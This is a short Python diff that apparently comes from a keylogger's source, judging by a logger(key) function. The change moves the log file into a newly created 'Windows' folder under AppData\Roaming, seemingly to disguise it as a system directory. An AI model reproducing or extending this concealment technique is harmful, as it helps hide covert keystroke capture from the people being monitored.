@@ -12,7 +12,10 @@ def getlogfilename():
     
 
 def getlogfilepath(filename):
-    filepath = os.path.join("C:\\Users", username, "AppData\\Roaming", filename)
+    dirpath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows")
+    if not(os.path.isdir(dirpath)):
+        os.makedirs(os.path.join(dirpath))
+    filepath = os.path.join("C:\\Users", username, "AppData\\Roaming\\Windows", filename)
     return filepath
 
 def logger(key):
